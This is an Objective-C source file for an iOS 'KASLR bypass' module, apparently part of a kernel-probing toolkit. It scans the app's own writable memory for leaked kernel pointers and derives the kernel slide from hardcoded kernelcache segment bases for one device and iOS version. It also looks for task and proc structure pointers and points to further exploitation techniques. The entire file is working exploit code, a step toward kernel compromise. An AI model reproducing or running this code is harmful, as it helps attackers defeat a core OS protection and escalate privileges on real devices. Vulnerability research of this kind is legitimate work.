#import "KPKASLRBypassModule.h"
#import <UIKit/UIKit.h>
#import "KPLog.h"
#import <mach/mach.h>

@interface KPKASLRBypassModule ()
@property (nonatomic, copy) NSString *identifier;
@property (nonatomic, copy) NSString *title;
@property (nonatomic, copy) NSString *subtitle;
@property (nonatomic, copy) NSString *icon;
@property (nonatomic, assign) KPTestSection section;
@end

@implementation KPKASLRBypassModule

- (instancetype)initWithNameSweep {
    self = [super init];
    if (self) {
        _identifier = @"kaslr.bypass";
        _title = @"KASLR bypass (RW region scan)";
        _subtitle = @"scan user-space RW regions for kernel pointers -> slide";
        _icon = @"lock.open";
        _section = KPTestSectionKernelProbes;
    }
    return self;
}

- (void)journal:(NSString *)line {
    NSString *path = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES).firstObject
                      stringByAppendingPathComponent:@"kp-kaslr-journal.log"];
    NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:path];
    if (!fh) {
        [[NSFileManager defaultManager] createFileAtPath:path contents:nil attributes:nil];
        fh = [NSFileHandle fileHandleForWritingAtPath:path];
    }
    [fh seekToEndOfFile];
    [fh writeData:[[line stringByAppendingString:@"\n"] dataUsingEncoding:NSUTF8StringEncoding]];
    [fh synchronizeFile];
    [fh closeFile];
    [KPLog.shared appendFormat:@"[kaslr] %@", line];
}

// Kernel pointer range on arm64e iOS: 0xfffffff000000000 - 0xfffffff100000000
// PAC-signed pointers: 0xfffffff8... - 0xffffffff...
static BOOL isKernelPtr(uint64_t v) {
    return (v >> 32) == 0xfffffff0ULL || (v >> 32) == 0xfffffff1ULL
        || (v >> 32) == 0xfffffff8ULL || (v >> 32) == 0xfffffff9ULL
        || (v >> 32) == 0xfffffffaULL || (v >> 32) == 0xfffffffbULL
        || (v >> 32) == 0xfffffffcULL || (v >> 32) == 0xfffffffdULL
        || (v >> 32) == 0xffffffe0ULL || (v >> 32) == 0xffffffe1ULL;
}

// Known static segment bases for iOS 27.0.1 iPhone16,1 (from kernelcache Mach-O)
static const uint64_t kStaticBases[] = {
    0xfffffff007004000ULL,  // __TEXT
    0xfffffff00700c000ULL,  // __PRELINK_TEXT
    0xfffffff007ce0000ULL,  // __DATA_CONST
    0xfffffff0082b0000ULL,  // __DATA_SPTM
    0xfffffff0082fc000ULL,  // __TEXT_EXEC
    0xfffffff00b02c000ULL,  // __TEXT_BOOT_EXEC
    0xfffffff00b034000ULL,  // __PRELINK_INFO
    0xfffffff00b284000ULL,  // __DATA
    0xfffffff00b4e8000ULL,  // __LINKEDIT
};
static const char *kStaticNames[] = {
    "__TEXT", "__PRELINK_TEXT", "__DATA_CONST", "__DATA_SPTM",
    "__TEXT_EXEC", "__TEXT_BOOT_EXEC", "__PRELINK_INFO", "__DATA", "__LINKEDIT"
};
static const int kStaticCount = sizeof(kStaticBases) / sizeof(kStaticBases[0]);

- (NSString *)runReport {
    NSMutableString *report = [NSMutableString string];
    [report appendString:@"=== KexProofV4 · KASLR bypass (RW region scan) ===\n"];
    [report appendString:@"Technique: scan user-space RW regions for kernel pointers.\n"];
    [report appendString:@"Ref: asuka4scape KASLR bypass.\n"];
    [report appendFormat:@"Target: iOS %@ uid=%d\n", UIDevice.currentDevice.systemVersion, getuid()];

    // --- Phase 1: enumerate and scan RW regions ---
    [report appendString:@"\n--- Phase 1: RW region scan ---\n"];

    kern_return_t kr;
    vm_address_t addr = 0;
    vm_size_t size = 0;
    uint32_t depth = 0;
    vm_region_submap_info_data_64_t info;
    mach_msg_type_number_t count;

    int regionCount = 0;
    int rwRegionCount = 0;
    int totalKptrs = 0;

    // Slide candidates: map<slide, count>
    #define MAX_CANDIDATES 256
    uint64_t slideCandidates[MAX_CANDIDATES] = {0};
    int slideCounts[MAX_CANDIDATES] = {0};
    int candidateCount = 0;

    // Collected kernel pointers (first 32)
    #define MAX_KPTRS 32
    uint64_t foundKptrs[MAX_KPTRS] = {0};
    uint64_t foundKptrAddrs[MAX_KPTRS] = {0};
    int foundCount = 0;

    while (1) {
        addr = (addr == 0) ? 0 : addr + size;
        count = VM_REGION_SUBMAP_INFO_COUNT_64;
        kr = vm_region_recurse_64(mach_task_self(), &addr, &size, &depth,
                                   (vm_region_recurse_info_t)&info, &count);
        if (kr != KERN_SUCCESS) break;

        regionCount++;

        // Only scan read-write regions
        if (!(info.protection & VM_PROT_WRITE)) continue;
        if (info.is_submap) { depth++; continue; }
        rwRegionCount++;

        // Skip huge regions (>16MB) to avoid scanning too much
        if (size > 16 * 1024 * 1024) continue;

        // Scan for kernel pointers
        volatile uint64_t *p = (volatile uint64_t *)addr;
        size_t words = size / 8;
        for (size_t i = 0; i < words; i++) {
            uint64_t v = p[i];
            if (!isKernelPtr(v)) continue;

            totalKptrs++;

            // Save first few
            if (foundCount < MAX_KPTRS) {
                foundKptrs[foundCount] = v;
                foundKptrAddrs[foundCount] = addr + i * 8;
                foundCount++;
            }

            // Try to compute slide candidates
            for (int b = 0; b < kStaticCount; b++) {
                if (v > kStaticBases[b]) {
                    uint64_t slide = v - kStaticBases[b];
                    // Valid slide: positive, page-aligned, < 1GB (iOS 27 SPTM)
                    if ((slide & 0x3FFF) == 0 && slide < (1024ULL << 20)) {
                        // Verify pointer falls WITHIN segment bounds
                        // Segment sizes from kernelcache Mach-O
                        static const uint64_t kStaticSizes[] = {
                            0x8000, 0xcd4000, 0x5d0000, 0x4c000,
                            0x2d30000, 0x8000, 0x250000, 0x264000, 0xc0000
                        };
                        uint64_t segEnd = kStaticBases[b] + kStaticSizes[b];
                        uint64_t runtimeSegEnd = segEnd + slide;
                        if (v < runtimeSegEnd) {
                            // Check if this slide is already in candidates
                            BOOL found = NO;
                            for (int c = 0; c < candidateCount; c++) {
                                if (slideCandidates[c] == slide) {
                                    slideCounts[c]++;
                                    found = YES;
                                    break;
                                }
                            }
                            if (!found && candidateCount < MAX_CANDIDATES) {
                                slideCandidates[candidateCount] = slide;
                                slideCounts[candidateCount] = 1;
                                candidateCount++;
                            }
                        }
                    }
                }
            }
        }
    }

    [report appendFormat:@"regions scanned: %d (RW: %d)\n", regionCount, rwRegionCount];
    [report appendFormat:@"kernel pointers found: %d\n", totalKptrs];

    // --- Phase 2: report found kernel pointers ---
    [report appendString:@"\n--- Phase 2: kernel pointers ---\n"];
    for (int i = 0; i < foundCount && i < 16; i++) {
        [report appendFormat:@"  [%d] @ user=0x%llx -> kval=0x%llx\n",
         i, foundKptrAddrs[i], foundKptrs[i]];
    }

    // --- Phase 3: slide candidates ---
    [report appendString:@"\n--- Phase 3: slide candidates ---\n"];
    if (candidateCount == 0) {
        [report appendString:@"No valid slide candidates found.\n"];
        [report appendString:@"Kernel pointers may use different segment bases.\n"];
        [report appendString:@"Try: extract segment bases from kernelcache.\n"];
    } else {
        // Sort by frequency (simple bubble sort for small N)
        for (int i = 0; i < candidateCount - 1; i++) {
            for (int j = 0; j < candidateCount - i - 1; j++) {
                if (slideCounts[j] < slideCounts[j + 1]) {
                    uint64_t ts = slideCandidates[j];
                    int tc = slideCounts[j];
                    slideCandidates[j] = slideCandidates[j + 1];
                    slideCounts[j] = slideCounts[j + 1];
                    slideCandidates[j + 1] = ts;
                    slideCounts[j + 1] = tc;
                }
            }
        }

        for (int i = 0; i < candidateCount && i < 10; i++) {
            [report appendFormat:@"  slide=0x%llx  hits=%d%s\n",
             slideCandidates[i], slideCounts[i],
             (i == 0) ? "  <-- MOST FREQUENT" : ""];
        }

        uint64_t bestSlide = slideCandidates[0];
        [report appendFormat:@"\n*** KASLR SLIDE = 0x%llx ***\n", bestSlide];
        [report appendFormat:@"Kernel base (if __TEXT=0xfffffff007004000): 0x%llx\n",
         0xfffffff007004000ULL + bestSlide];
    }

    // --- Phase 4: known structure pointer hunt ---
    [report appendString:@"\n--- Phase 4: structure pointer hunt ---\n"];
    // Look for pointers that look like task/proc structures
    // proc->p_pid is at +0x60, task->bsd_info is at +0x410
    // If we find a kernel pointer to what might be a task struct,
    // check nearby values for our PID
    int ourPID = getpid();
    [report appendFormat:@"our PID: %d\n", ourPID];

    int taskCands = 0;
    for (int i = 0; i < foundCount; i++) {
        // Kernel pointers in __DATA range might be task/proc
        uint64_t v = foundKptrs[i];
        // Rough heuristic: task structs are in kernel heap (0xffffffe0... range)
        if ((v >> 32) == 0xffffffe0ULL || (v >> 32) == 0xffffffe1ULL) {
            taskCands++;
            if (taskCands <= 5) {
                [report appendFormat:@"  possible task/proc: 0x%llx (from user=0x%llx)\n",
                 v, foundKptrAddrs[i]];
            }
        }
    }
    [report appendFormat:@"task/proc candidates: %d\n", taskCands];

    // --- Verdict ---
    [report appendString:@"\n"];
    if (totalKptrs > 0 && candidateCount > 0) {
        [report appendString:@"VERDICT: KASLR_BYPASS_CANDIDATES_FOUND\n"];
        [report appendString:@"Kernel pointers visible in user-space RW regions.\n"];
        [report appendString:@"Slide computed from segment base alignment.\n"];
    } else if (totalKptrs > 0) {
        [report appendString:@"VERDICT: KPTR_FOUND_NO_SLIDE\n"];
        [report appendString:@"Kernel pointers found but no valid slide.\n"];
        [report appendString:@"Update kStaticBases[] with correct segment addresses.\n"];
    } else {
        [report appendString:@"VERDICT: NO_KPTR_IN_RW_REGIONS\n"];
        [report appendString:@"No kernel pointers in user-space RW regions.\n"];
        [report appendString:@"Try: IOSurface, vm_remap kernel pages, or OOL OOB-read.\n"];
    }

    return report;
}

@end
